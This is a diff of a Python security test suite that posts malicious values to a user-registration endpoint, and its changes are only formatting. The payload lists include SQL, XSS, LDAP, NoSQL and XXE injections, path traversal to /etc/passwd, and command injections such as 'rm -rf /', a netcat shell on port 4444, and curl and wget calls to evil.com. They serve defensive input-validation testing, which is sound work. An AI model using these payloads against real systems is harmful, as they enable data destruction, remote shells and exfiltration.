@@ -20,15 +20,15 @@ class TestInputValidation:
             "test-user",
             "test123",
             "TestUser",
-            "test.user"
+            "test.user",
         ]
-        
+
         for username in valid_usernames:
             user_data = {
                 "username": username,
                 "email": "test@example.com",
                 "password": "testpassword123",
-                "full_name": "Test User"
+                "full_name": "Test User",
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should succeed or fail due to duplicate username, not validation
@@ -49,15 +49,15 @@ class TestInputValidation:
             "test\ruser",
             "test\buser",
             "test\fuser",
-            "test\vuser"
+            "test\vuser",
         ]
-        
+
         for username in malicious_usernames:
             user_data = {
                 "username": username,
                 "email": "test@example.com",
                 "password": "testpassword123",
-                "full_name": "Test User"
+                "full_name": "Test User",
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should fail validation or be blocked by security middleware
@@ -70,15 +70,15 @@ class TestInputValidation:
             "test@example.com",
             "user.name@domain.co.uk",
             "test+tag@example.org",
-            "123@test.com"
+            "123@test.com",
         ]
-        
+
         for email in valid_emails:
             user_data = {
                 "username": f"testuser_{email.split('@')[0]}",
                 "email": email,
                 "password": "testpassword123",
-                "full_name": "Test User"
+                "full_name": "Test User",
             }
             response = client.post("/api/auth/register", json=user_data)
             assert response.status_code in [200, 400]
@@ -92,15 +92,15 @@ class TestInputValidation:
             "test@example.com\x00",
             "test@example.com\n",
             "test@example.com\t",
-            "test@example.com\r"
+            "test@example.com\r",
         ]
-        
+
         for email in malicious_emails:
             user_data = {
                 "username": f"testuser_{len(email)}",
                 "email": email,
                 "password": "testpassword123",
-                "full_name": "Test User"
+                "full_name": "Test User",
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should fail validation
@@ -113,15 +113,15 @@ class TestInputValidation:
             "testpassword123",
             "TestPassword123!",
             "MySecure@Pass123",
-            "1234567890abcdef"
+            "1234567890abcdef",
         ]
-        
+
         for password in valid_passwords:
             user_data = {
                 "username": f"testuser_{len(password)}",
                 "email": f"test{len(password)}@example.com",
                 "password": password,
-                "full_name": "Test User"
+                "full_name": "Test User",
             }
             response = client.post("/api/auth/register", json=user_data)
             assert response.status_code in [200, 400]
@@ -137,15 +137,15 @@ class TestInputValidation:
             "password\r",
             "password\b",
             "password\f",
-            "password\v"
+            "password\v",
         ]
-        
+
         for password in malicious_passwords:
             user_data = {
                 "username": f"testuser_{len(password)}",
                 "email": f"test{len(password)}@example.com",
                 "password": password,
-                "full_name": "Test User"
+                "full_name": "Test User",
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should fail validation or be handled securely
@@ -159,7 +159,7 @@ class TestInputValidation:
             "Test-User",
             "Test_User",
             "Test O'User",
-            "Test \"User\"",
+            'Test "User"',
             "Test & User",
             "Test + User",
             "Test = User",
@@ -186,15 +186,15 @@ class TestInputValidation:
             "Test : User",
             "Test ; User",
             "Test ' User",
-            "Test \" User"
+            'Test " User',
         ]
-        
+
         for name in valid_names:
             user_data = {
                 "username": f"testuser_{len(name)}",
                 "email": f"test{len(name)}@example.com",
                 "password": "testpassword123",
-                "full_name": name
+                "full_name": name,
             }
             response = client.post("/api/auth/register", json=user_data)
             assert response.status_code in [200, 400]
@@ -210,15 +210,15 @@ class TestInputValidation:
             "Test\rUser",
             "Test\bUser",
             "Test\fUser",
-            "Test\vUser"
+            "Test\vUser",
         ]
-        
+
         for name in malicious_names:
             user_data = {
                 "username": f"testuser_{len(name)}",
                 "email": f"test{len(name)}@example.com",
                 "password": "testpassword123",
-                "full_name": name
+                "full_name": name,
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should fail validation or be blocked by security middleware
@@ -228,23 +228,23 @@ class TestInputValidation:
         """Test handling of unicode characters in input fields."""
         unicode_inputs = [
             "测试用户",  # Chinese
-            "тест",      # Cyrillic
-            "テスト",     # Japanese
-            "اختبار",    # Arabic
-            "בדיקה",     # Hebrew
-            "ทดสอบ",     # Thai
-            "🎭",        # Emoji
-            "café",      # Accented characters
-            "naïve",     # Accented characters
-            "résumé"     # Accented characters
+            "тест",  # Cyrillic
+            "テスト",  # Japanese
+            "اختبار",  # Arabic
+            "בדיקה",  # Hebrew
+            "ทดสอบ",  # Thai
+            "🎭",  # Emoji
+            "café",  # Accented characters
+            "naïve",  # Accented characters
+            "résumé",  # Accented characters
         ]
-        
+
         for unicode_input in unicode_inputs:
             user_data = {
                 "username": f"testuser_{len(unicode_input)}",
                 "email": f"test{len(unicode_input)}@example.com",
                 "password": "testpassword123",
-                "full_name": unicode_input
+                "full_name": unicode_input,
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should handle unicode properly
@@ -254,14 +254,14 @@ class TestInputValidation:
         """Test handling of very long input strings."""
         # Very long strings (10KB each)
         long_string = "x" * 10000
-        
+
         user_data = {
             "username": long_string,
             "email": f"{long_string}@example.com",
             "password": long_string,
-            "full_name": long_string
+            "full_name": long_string,
         }
-        
+
         response = client.post("/api/auth/register", json=user_data)
         # Should handle long inputs appropriately (likely fail validation)
         assert response.status_code in [422, 400, 403, 413]
@@ -272,15 +272,15 @@ class TestInputValidation:
             "test\x00user",
             "test@example.com\x00",
             "testpassword\x00123",
-            "Test\x00User"
+            "Test\x00User",
         ]
-        
+
         for i, null_input in enumerate(null_byte_inputs):
             user_data = {
                 "username": f"testuser_{i}",
                 "email": f"test{i}@example.com",
                 "password": "testpassword123",
-                "full_name": null_input
+                "full_name": null_input,
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should handle null bytes securely
@@ -295,9 +295,9 @@ class TestInputValidation:
             "full_name": "Test User",
             "malicious_field": "<script>alert('xss')</script>",
             "__proto__": {"isAdmin": True},
-            "constructor": {"prototype": {"isAdmin": True}}
+            "constructor": {"prototype": {"isAdmin": True}},
         }
-        
+
         response = client.post("/api/auth/register", json=malicious_json)
         # Should ignore extra fields and handle malicious content
         assert response.status_code in [200, 400, 422]
@@ -311,15 +311,15 @@ class TestInputValidation:
             "admin'--",
             "admin'/*",
             "' OR 1=1 --",
-            "'; INSERT INTO users VALUES ('hacker', 'hacker@evil.com', 'password'); --"
+            "'; INSERT INTO users VALUES ('hacker', 'hacker@evil.com', 'password'); --",
         ]
-        
+
         for i, injection in enumerate(sql_injections):
             user_data = {
                 "username": f"testuser_{i}",
                 "email": f"test{i}@example.com",
                 "password": "testpassword123",
-                "full_name": injection
+                "full_name": injection,
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should handle SQL injection attempts securely
@@ -342,15 +342,15 @@ class TestInputValidation:
             "<audio src=x onerror=alert('xss')>",
             "<details open ontoggle=alert('xss')>",
             "<marquee onstart=alert('xss')>",
-            "<math><mi//xlink:href=data:x,<script>alert('xss')</script>"
+            "<math><mi//xlink:href=data:x,<script>alert('xss')</script>",
         ]
-        
+
         for i, payload in enumerate(xss_payloads):
             user_data = {
                 "username": f"testuser_{i}",
                 "email": f"test{i}@example.com",
                 "password": "testpassword123",
-                "full_name": payload
+                "full_name": payload,
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should handle XSS attempts securely
@@ -365,15 +365,15 @@ class TestInputValidation:
             "..%2F..%2F..%2Fetc%2Fpasswd",
             "..%252F..%252F..%252Fetc%252Fpasswd",
             "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
+            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
         ]
-        
+
         for i, payload in enumerate(path_traversal_payloads):
             user_data = {
                 "username": f"testuser_{i}",
                 "email": f"test{i}@example.com",
                 "password": "testpassword123",
-                "full_name": payload
+                "full_name": payload,
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should handle path traversal attempts securely
@@ -391,15 +391,15 @@ class TestInputValidation:
             "; rm -rf /",
             "| nc -l -p 4444 -e /bin/sh",
             "&& curl http://evil.com/steal",
-            "|| wget http://evil.com/steal"
+            "|| wget http://evil.com/steal",
         ]
-        
+
         for i, injection in enumerate(command_injections):
             user_data = {
                 "username": f"testuser_{i}",
                 "email": f"test{i}@example.com",
                 "password": "testpassword123",
-                "full_name": injection
+                "full_name": injection,
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should handle command injection attempts securely
@@ -416,15 +416,15 @@ class TestInputValidation:
             "*))(|(objectClass=user",
             "*))(|(objectClass=person",
             "*))(|(objectClass=organizationalPerson",
-            "*))(|(objectClass=inetOrgPerson"
+            "*))(|(objectClass=inetOrgPerson",
         ]
-        
+
         for i, injection in enumerate(ldap_injections):
             user_data = {
                 "username": f"testuser_{i}",
                 "email": f"test{i}@example.com",
                 "password": "testpassword123",
-                "full_name": injection
+                "full_name": injection,
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should handle LDAP injection attempts securely
@@ -433,19 +433,19 @@ class TestInputValidation:
     def test_xml_injection_attempts(self, client: TestClient, clean_databases):
         """Test XML injection attempts."""
         xml_injections = [
-            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
-            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
-            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/steal\">]><foo>&xxe;</foo>",
-            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ftp://evil.com/steal\">]><foo>&xxe;</foo>",
-            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"gopher://evil.com/steal\">]><foo>&xxe;</foo>"
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/steal">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://evil.com/steal">]><foo>&xxe;</foo>',
         ]
-        
+
         for i, injection in enumerate(xml_injections):
             user_data = {
                 "username": f"testuser_{i}",
                 "email": f"test{i}@example.com",
                 "password": "testpassword123",
-                "full_name": injection
+                "full_name": injection,
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should handle XML injection attempts securely
@@ -454,29 +454,29 @@ class TestInputValidation:
     def test_no_sql_injection_attempts(self, client: TestClient, clean_databases):
         """Test NoSQL injection attempts."""
         nosql_injections = [
-            "{\"$ne\": null}",
-            "{\"$gt\": \"\"}",
-            "{\"$regex\": \".*\"}",
-            "{\"$where\": \"this.username == 'admin'\"}",
-            "{\"$or\": [{\"username\": \"admin\"}, {\"username\": \"testuser\"}]}",
-            "{\"$and\": [{\"username\": {\"$ne\": null}}, {\"password\": {\"$ne\": null}}]}",
-            "{\"$nor\": [{\"username\": \"admin\"}]}",
-            "{\"$not\": {\"username\": \"admin\"}}",
-            "{\"$all\": [\"admin\", \"testuser\"]}",
-            "{\"$in\": [\"admin\", \"testuser\"]}",
-            "{\"$nin\": [\"admin\", \"testuser\"]}",
-            "{\"$exists\": true}",
-            "{\"$type\": \"string\"}",
-            "{\"$size\": 0}",
-            "{\"$mod\": [10, 0]}"
+            '{"$ne": null}',
+            '{"$gt": ""}',
+            '{"$regex": ".*"}',
+            '{"$where": "this.username == \'admin\'"}',
+            '{"$or": [{"username": "admin"}, {"username": "testuser"}]}',
+            '{"$and": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}',
+            '{"$nor": [{"username": "admin"}]}',
+            '{"$not": {"username": "admin"}}',
+            '{"$all": ["admin", "testuser"]}',
+            '{"$in": ["admin", "testuser"]}',
+            '{"$nin": ["admin", "testuser"]}',
+            '{"$exists": true}',
+            '{"$type": "string"}',
+            '{"$size": 0}',
+            '{"$mod": [10, 0]}',
         ]
-        
+
         for i, injection in enumerate(nosql_injections):
             user_data = {
                 "username": f"testuser_{i}",
                 "email": f"test{i}@example.com",
                 "password": "testpassword123",
-                "full_name": injection
+                "full_name": injection,
             }
             response = client.post("/api/auth/register", json=user_data)
             # Should handle NoSQL injection attempts securely
